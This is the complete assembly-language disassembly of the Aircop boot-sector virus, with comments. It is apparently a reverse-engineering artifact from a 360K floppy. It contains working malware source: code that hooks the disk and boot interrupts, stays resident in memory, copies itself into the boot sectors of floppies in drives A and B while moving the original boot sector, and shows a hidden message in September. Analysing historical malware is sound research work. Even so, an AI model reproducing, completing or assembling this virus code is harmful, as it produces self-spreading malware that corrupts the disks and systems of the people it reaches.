﻿

;AIRCOP VIRUS DISASSEMBLY
;AS FOUND ON A 360K DISK
;ORGINAL BOOT MOVED TO TRACK 39 SECTOR 9  FOR 360
;FOR 1.2K DISK RELOCATED AT TRACK 79 SECTOR 15
;ON ANY DAY IN SEPTEMBER A MESSAGE 'This is Aircop'
;SHOULD BE DISPLAYED

VIRUS   SEGMENT BYTE
        ASSUME  CS:VIRUS, DS:VIRUS, ES:VIRUS, SS:VIRUS


VIR_START        EQU     43h

INT13_OFF        equ     4Ch          ;INT 13
INT13_SEG        equ     4Eh          ;

INT19_OFF        equ     64h           ;INT 19
INT19_SEG        equ     66h           ;

MEM_SIZE        equ     413h                    ;*

;OLD_INT13_OFF        equ     7DA9h                   ;*
;OLD_INT13_SEG        equ     7DABh                   ;*

;OLD_INT19_OFF        equ     7DADh                   ;*
;OLD_INT19_SEG        equ     7DAFh                   ;*

                ORG     100H
START:          JMP     ST1
                ORG     7C00H

ST1:             JMP     V_START                 ;0136

DOS_ID          DB     'MSDOS5.0'
SEC_SIZE        DW      200H
SECS_PER_SIZE   DB      02
FAT_START       DW      1
FAT_COUNT       DB      2
ROOT_ENTRIES    DW      0E0H
SEC_COUNT       DW      0b40H
DISK_ID         DB      0F0H
SECS_PER_FAT    DW      9h
SECS_PER_TRK    DW      12h
HEADS           DW      2
HIDDEN_SECS     DW      0, 0
T_NUM_OF_SECS   DW      0, 0
DR_NUM          DB      0
RES1            DB      0
SIGNATURE       DB      0
VOL_SERIAL      DB      00, 00, 00, 00
VOL_LABEL       DB      0, 0, 0, 0, 12h, 0, 0, 0 ,0, 1, 0
;RES2            DB      0, 0, 0, 0, 0, 0, 0, 0

V_START:

                CLI
                XOR     AX,AX
                MOV     DS,AX
                MOV     SS,AX
                MOV     BX,7C00H
                MOV     SP,BX

                PUSH    DS                   ;PUSHED FOR RETF FOR BOOT
                PUSH    BX                   ;

                DEC     WORD PTR DS:[MEM_SIZE]           ;RESIZE MEM - 1K
                INT     12H                              ;GET MEM SIZE IN AX
                MOV     CL,06                            ;
                SHL     AX,CL                            ;

                MOV     ES,AX                            ; HOOK INT 13
                XCHG    AX,DS:[INT13_SEG]                ;
                MOV     [OLD_INT13_SEG],AX

                MOV     AX,OFFSET VIR_INT13 - 7C00H
                XCHG    AX,DS:[INT13_OFF]
                MOV     [OLD_INT13_OFF],AX

                MOV     AX,ES                            ; HOOK INT 19
                XCHG    AX,DS:[INT19_SEG]                ;
                MOV     [OLD_INT19_SEG],AX

                MOV     AX,OFFSET VIR_INT19 - 7C00H
                XCHG    AX,DS:[INT19_OFF]
                MOV     [OLD_INT19_OFF],AX

                XOR     DI,DI                            ; MOV VIRUS TO hIGH
                MOV     SI,BX                            ; MEM BELOW 640K
                MOV     CX,0100H
                cld
                REPZ    MOVSW

                STI                                      ;JUMP THERE
                PUSH    ES                               ;
                MOV     AX,OFFSET HI_MEM - 7C00H         ;
                PUSH    AX                               ;
                RETF                                     ;

HI_MEM:
                PUSH    BX                               ; READ FAT GET
                XOR     DL,DL                            ; LOCATION OF ORG
                CALL    READ_FAT                         ; BOOT IN CX

                POP     BX                               ; SET UP TO READ
                PUSH    DS                               ; ORG BOOT
                POP     ES                               ; TO LOCATION
                MOV     AH,02                            ;  0000:7C00

                MOV     DH,01                            ; DO THE READ
                CALL    DISK_IO_HD2                      ;

                JB      IF_ERROR

                PUSH    CS
                POP     DS

                MOV     SI,0BH                           ;COMPARE
                MOV     DI,7C0BH                         ;2BH BYTES
                MOV     CX,2BH                           ;DOS_ID TO VOL LABEL
                CLD                                      ;BACKWARDS
                REPZ    CMPSB                            ;
                JZ      BOOT                             ; IF EQUAL BOOT

IF_ERROR:
                POP     BX                              ; IF NOT MATCH THEN
                POP     AX                              ; DISPLAY ERROR
                PUSH    CS                              ; MESSAGE
                MOV     AX,OFFSET JMP_MESS - 7C00H      ;
                PUSH    AX                              ;
BOOT:
                RETF                                    ;GOTO BOOT COMP

JMP_MESS:       PUSH    CS                              ; DISPLAY ERROR MESS
                POP     DS                              ;
                MOV     SI, OFFSET MESS1 - 7C00H        ;
                CALL    PRINT_MESSAGE                   ;

                XOR     AH,AH                           ;WAIT FOR KEYSTROKE
                INT     16H

VIR_INT19:
                XOR     AX,AX                           ;RESET DISK
                INT     13h                             ;

                PUSH    CS
                POP     ES

                MOV     BX,200H                         ; READ SECTOR SIX
                MOV     CX,6H                           ; BELOW
                XOR     DX,DX                           ; OUR PRESENT LOCATION
                MOV     AX,0201H                        ;
                INT     13H                             ;
                JB      JMP_MESS                        ; IF PROBLEM
                MOV     CX,0FF0H
                MOV     DS,CX
                JMP     DWORD PTR CS:[OLD_INT19_OFF - 7C00H]   ;TRY AN INT 19

PRINT_MESSAGE:
                MOV     BX,7                           ; PROCEDURE FOR
                CLD                                    ; PRINTING BOTH
                LODSB                                  ; MESSAGS
                OR      AL,AL                          ;
                JZ      RETURN                         ;
                JNS     NO_DECOD                       ;
                XOR     AL,0D7H                        ;
                OR      BL,88H                         ;
NO_DECOD:                                              ;
                CMP     AL,20H                         ;
                JBE     TELETYPE                       ;
                MOV     CX,01H                         ;
                MOV     AH,09H                         ;
                INT     10H                            ;
                                                       ;
TELETYPE:                                              ;
                MOV     AH,0EH                         ;
                INT     10H                            ;
                JMP     PRINT_MESSAGE                  ;
;******************************************


READ_FAT:
                MOV     BX,0200H                        ;READ THE FAT IN TO
                MOV     CX,02H                          ;BELOW VIRUS
                MOV     AH,CL                           ;GET MEDIA TYPE
                CALL    DISK_IO                         ;TO LOCATE WHERE
                                                        ;ORGINAL BOOT SHOULD
                MOV     CX,2709H                        ;PUT OR READ FROM
                XOR     BYTE PTR ES:[BX],0FDH           ;
                JZ      LOW_DENS                        ;
                MOV     CX,4F0FH                        ;
LOW_DENS:                                               ;
                JMP     RETURN                          ;
                                                        ;

;***********************************************
;BELOW IS A BIT OF CODE THAT DEPENDING ON WHERE YOU ENTER AND
;WHAT YOU PUT INTO THE REGS IS WHAT WILL HAPPEN
;ALL DISK I/O STUFF

READ_SECTOR:
                MOV     AH,02
                MOV     BX,0200H
ONE_SECTOR:
                MOV     CX,01

DISK_IO:
                MOV     DH,00
DISK_IO_HD2:
                MOV     AL,01
BIOS_INT13:
                PUSHF
                CALL    DWORD PTR CS:[OLD_INT13_OFF - 7C00H]
RETURN:
                RET
;*********************************************************
; VIRAL PART OF PROGRAM WHERE THE SPREAD OF VIRUS OCCURS
; IF CERTAIN ERRORS OCCUR WE CHECK DATE IF SEPT THEN DISPLAY
; MESSAGE

VIR_INT13:
                PUSH    AX
                PUSH    BX
                PUSH    CX
                PUSH    DX
                PUSH    ES
                PUSH    DS
                PUSH    SI
                PUSH    DI
                PUSHF

                PUSH    CS
                POP     DS

                CMP     DL,01                   ;IS DISK A OR B CALLED
                JA      CHK_DATE                ; IF NOT

                AND     AX,0FE00H               ;CHECKS FOR READ OR WRITE
                JZ      CHK_DATE                ;IF NOT

                XCHG    AL,CH                   ; SOME SORT OF CHECK ???
                SHL     AL,1                    ;
                ADD     AL,DH                   ;
                MOV     AH,09H                  ;
                MUL     AH                      ;
                ADD     AX,CX                   ;
                SUB     AL,06H                  ;
                CMP     AX,0006H                ;
                JA      CHK_DATE                ;

                PUSH    CS
                POP     ES

                CALL    READ_SECTOR             ;READ BOOT SECTOR
                JB      RESET_DISK              ;
                MOV     DI,vir_start            ; 0043H  V_START + 0EH
                MOV     SI,vir_start + 200h     ; 0243H  V_START + 20EH
                MOV     CX,0EH                  ;CHECK 14 BYTES
                STD
                REPZ    CMPSB
                JZ      CHK_DATE                ;IF EQUAL THAN ALREDY INFECTED

                SUB     SI,CX                   ;SI 35 - 0 = 35
                SUB     DI,CX                   ;DI          235
                MOV     CL,33H                  ;THIS MANY BYTES MOVED
                REPZ    MOVSB                   ;FROM ORGINAL BOOT TO VIRAL
                                                ;JUMP FIRST 3 BYTES FILL REST

                CALL    READ_FAT                ;GET LOCATION OF NEW BOOT

                PUSH    CX                      ;SAVE LOCTION OF NEW BOOT
                PUSH    BX                      ;BX = 200H

                CALL    READ_SECTOR                     ;BOOT

                MOV     AH,03H                   ;WRITE THE VIRAL BOOT
                XOR     BX,BX                    ;TO NEW LOCATION
                CALL    ONE_SECTOR               ;

                POP     BX                       ;RESTORE  NEW LOCTION OF
                POP     CX                       ;BOOT
                JB      RESET_DISK

                mov     dh,01                    ;WRITE ORGIANL BOOT
                MOV     AH,03H                   ;
                CALL    DISK_IO_HD2              ;

RESET_DISK:
                XOR     AX,AX
                CALL    BIOS_INT13

CHK_DATE:
                MOV     AH,04H
                INT     1AH
                CMP     DH,09H
                JNZ     WRONG_DATE
                MOV     SI,OFFSET CODE_MESS - 7C00H
                CALL    PRINT_MESSAGE

WRONG_DATE:
                POPF
                POP     DI
                POP     SI
                POP     DS
                POP     ES
                POP     DX
                POP     CX
                POP     BX
                POP     AX
                JMP     DWORD PTR CS:[OLD_INT13_OFF - 7C00H]

DATA:
OLD_INT13_OFF   DW      0
OLD_INT13_SEG   DW      0

OLD_INT19_OFF   DW      0
OLD_INT19_SEG   DW      0

CODE_MESS       DB      0DAH, 0DDH, 020H, 083H, 0BFH
                DB      0BEH, 0A4H, 0F7H, 0BEH, 0A4H, 0F7H
                DB      096H, 0BEH, 0A5H, 0B4H, 0B8H, 0A7H
                DB      0DAH, 0DDH, 00H

                DB      'IO      SYS'
                DB      'MSDOS   SYS'

MESS1           DB      0DH, 0AH
                DB      'Non-system disk or disk error',0DH, 0AH
                DB      00H, 00H
                DB      055H,0AAH

VIRUS   ENDS
        END     START


